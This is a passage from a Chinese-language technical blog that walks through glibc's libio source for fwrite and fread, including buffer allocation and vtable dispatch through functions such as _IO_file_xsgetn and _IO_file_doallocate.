to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure><p>调用<strong>libio&#x2F;genops.c</strong>的_IO_default_xsputn第一个参数为文件流结构体，第二个参数为内存数据起始点，第三个为输入大小size*count</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401175400733.png" alt="image-20230401175400733"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">          <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          _IO_ssize_t i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果要输入的数据小于缓冲区大小则把输入大小置为输入真实数据大小，否则按照缓冲区大小</p><ul><li><p>一次转移大于20时</p><ul><li>采用memcopy，进行传输</li></ul></li><li><p>一次转移大小小于20时</p><ul><li>采用for循环进行赋值</li></ul></li></ul><p>缓冲区不够时会_IO_OVERFLOW刷新缓冲区</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401182422401.png" alt="image-20230401182422401"></p><h4 id="fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k"><a href="#fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k" class="headerlink" title="fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k"></a>fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k</h4><p>do_write为缓冲区大小的倍数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_write)&#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;fileops.c</strong></p><p>new_do_write第一个参数为文件流结构体，第二个参数为内存数据起始点，第三个为输入大小do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先检测_IO_IS_APPENDING标志位它表示文件流的当前位置是否处于文件的末尾，并且文件以”追加模式”打开。</p><p>fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base不相等时会_IO_SYSSEEK()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSEEK(FP, OFFSET, MODE) JUMP2 (__seek, FP, OFFSET, MODE)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用虚表里的seek对应的__GI__IO_file_seek&#x3D;&#x3D;<mark></mark></mark></p><p>不过条件不成立，直接调用_IO_SYSWRITE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用了vtable中__write对应的<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong>中**_IO_new_file_write**</p><p>第一个参数为文件流结构体，第二个参数为内存数据起始点，第三个为输入大小do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_write (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_ssize_t n)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">               ? write_not_cancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">               : write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span class="type">char</span> *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行系统调用write把数据写入文件，</p><p>调用_IO_adjust_column更新文件流结构体中的_cur_column</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span></span><br><span class="line">_IO_adjust_column (<span class="type">unsigned</span> start, <span class="type">const</span> <span class="type">char</span> *line, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = line + count;</span><br><span class="line">  <span class="keyword">while</span> (ptr &gt; line)</span><br><span class="line">    <span class="keyword">if</span> (*--ptr == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> line + count - ptr - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> start + count;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_adjust_column)</span><br></pre></td></tr></table></figure><p>朴素的通过检测‘\n’来统计增加的行数</p><p>未对齐的数据回到 <strong>_IO_default_xsputn</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>调用_IO_default_xsputn，和&lt;的一样进入缓冲区</p><p><strong>哎呀你干嘛，突然意识到，小于缓冲区的大小的数据只是被送进了缓冲区，没有被写入文件啊。。。别急还有fclose没有分析，谁知道未来的fclose会发生什么呢</strong></p><h2 id="fwrite-函数调用的vtable函数"><a href="#fwrite-函数调用的vtable函数" class="headerlink" title="fwrite 函数调用的vtable函数"></a>fwrite 函数调用的vtable函数</h2><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fread</title>
      <link href="/2023/03/31/IO-FILE-fread/"/>
      <url>/2023/03/31/IO-FILE-fread/</url>
      
        <content type="html"><![CDATA[<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>首先感谢一下ray-cp师傅的文章 <a href="https://www.anquanke.com/post/id/177958#h2-5">https://www.anquanke.com/post/id/177958#h2-5</a></p><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>];</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./text&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">( <span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span> ;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofread.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">weak_alias(_IO_fread , fread);</span><br></pre></td></tr></table></figure><p><strong>_IO_fread</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fread)</span><br></pre></td></tr></table></figure><p>首先CHECK_FILE检测fp合法性</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IO_DEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((FILE) == NULL) &#123; MAYBE_SET_EINVAL; return RET; &#125; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; COERCE_FILE(FILE); \</span></span><br><span class="line"><span class="meta">           <span class="keyword">if</span> (((FILE)-&gt;_IO_file_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) \</span></span><br><span class="line"><span class="meta">      &#123; MAYBE_SET_EINVAL; return RET; &#125;&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) COERCE_FILE (FILE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果定义了IO_DEBUG</p><p>FILE为空直接返回，否则检测FILE的flag魔数是否匹配</p><p>回到_IO_fread进行加锁后调用_IO_sgetn</p><p><strong>libio&#x2F;genops.c</strong></p><p>_IO_sgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">                       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE)&#123;&#125;).MEMBER)</span></span><br></pre></td></tr></table></figure><p>盖亚，fucking macro</p><blockquote><p><code>((struct _IO_FILE_plus)&#123;&#125;)</code> 创建了一个匿名的 <code>_IO_FILE_plus</code> 结构体，这个结构体里面只有一个 <code>vtable</code> 成员，其余成员都是默认值。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))-&gt;__xsgetn) (fp, data, n);</span><br></pre></td></tr></table></figure><p><mark><strong>最终调用虚表里的__xsgetn指向的_IO_file_xsgetn</strong><mark></mark></mark></p><hr><p><strong>libio&#x2F;fileops.c</strong></p><p>_IO_file_xsgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn(_IO_FILE* fp, <span class="type">void</span>* data, _IO_size_t n) &#123;</span><br><span class="line">  _IO_size_t want, have;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span>* s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf(fp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    <span class="keyword">if</span> (want &lt;= have) &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">      fp-&gt;_IO_read_ptr += want;</span><br><span class="line">      want = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (have &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">        s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">        s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        want -= have;</span><br><span class="line">        fp-&gt;_IO_read_ptr += have;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_in_backup(fp)) &#123;</span><br><span class="line">        _IO_switch_to_main_get_area(fp);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">         the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">         the user buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="type">size_t</span>)(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">         waiting for input. */</span></span><br><span class="line">      _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">      count = want;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base) &#123;</span><br><span class="line">        _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">        <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">          count -= want % block_size;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      count = _IO_SYSREAD(fp, s, count);</span><br><span class="line">      <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">          fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      s += count;</span><br><span class="line">      want -= count;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><h2 id="初始化输入缓冲区"><a href="#初始化输入缓冲区" class="headerlink" title="初始化输入缓冲区"></a>初始化输入缓冲区</h2><p>先检测是否有备份的缓冲区，有则将缓冲区释放掉，并把_IO_IN_BACKUP位置空<br>当程序需要从一个IO流中读取下一个字符时，它通常会从缓冲区中读取一个字符，如果缓冲区为空，则会触发一个IO操作，将更多的数据读入缓冲区中。但是在某些情况下，程序需要读取缓冲区中的备用字符，而不是从IO流中读取。此时，_IO_IN_BACKUP标志就会被设置，以指示下一个字符是备用字符而不是IO流中的字符。</p><p>然后调用_IO_doallocbuf(buf)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>检测值后调用_IO_DOALLOCATE</p><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _IO_DOALLOCATE(FP)  JUMP0(__doallocate , FP)</span></span><br></pre></td></tr></table></figure><p><mark>根据前面的经验调用虚表中的**__doallocate<strong>指向的</strong>_IO_file_doallocate**函数<mark></mark></mark></p><p><strong>libio&#x2F;filedoalloc.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate(_IO_FILE* fp) &#123;</span><br><span class="line">  _IO_size_t size;</span><br><span class="line">  <span class="type">char</span>* p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LIBC</span></span><br><span class="line">  <span class="comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span></span><br><span class="line"><span class="comment">     function it points to.  This is to make sure _IO_cleanup gets called</span></span><br><span class="line"><span class="comment">     on exit.  We call it from _IO_file_doallocate, since that is likely</span></span><br><span class="line"><span class="comment">     to get called by any program that does buffered I/O. */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(_IO_cleanup_registration_needed != <span class="literal">NULL</span>))</span><br><span class="line">    (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  size = _IO_BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect(_IO_SYSSTAT(fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (S_ISCHR(st.st_mode)) &#123;</span><br><span class="line">      <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">        DEV_TTY_P(&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        local_isatty(fp-&gt;_fileno))</span><br><span class="line">        fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span>)</span><br><span class="line">      size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb(fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>struct stat64是一个在UNIX和Linux系统中用于存储文件或目录元数据的数据结构。它的定义通常在头文件&lt;sys&#x2F;stat.h&gt;中，并包含以下成员：</p><ol><li>dev：文件所在设备的设备号</li><li>ino：文件的i节点号</li><li>mode：文件的访问权限和类型（如普通文件、目录、符号链接等）</li><li>nlink：文件的硬链接数</li><li>uid：文件所有者的用户ID</li><li>gid：文件所有者所在的组ID</li><li>rdev：如果文件是设备文件，则为设备号</li><li>size：文件大小（以字节为单位）</li><li>blksize：文件系统块大小（以字节为单位）</li><li>blocks：文件占用的块数（以文件系统块为单位）</li><li>atime：文件上一次被访问的时间</li><li>mtime：文件上一次修改的时间</li><li>ctime：文件上一次状态改变的时间（如文件所有者或权限的改变</li></ol><p><mark><strong>首先是_IO_SYSSTAT调用虚表中的__stat指向的_IO_file_stat函数</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSTAT(FP, BUF) JUMP1 (__stat, FP, BUF)</span></span><br></pre></td></tr></table></figure><p>系统调用SYS_fstat修改<strong>st.blksize</strong>大小</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331170443379.png" alt="image-20230331170443379"></p><p>然后申请了一块内存，调用<strong>libio&#x2F;genops.c</strong>中的**_IO_setb**</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb(_IO_FILE* f, <span class="type">char</span>* b, <span class="type">char</span>* eb, <span class="type">int</span> a) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span>(f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span 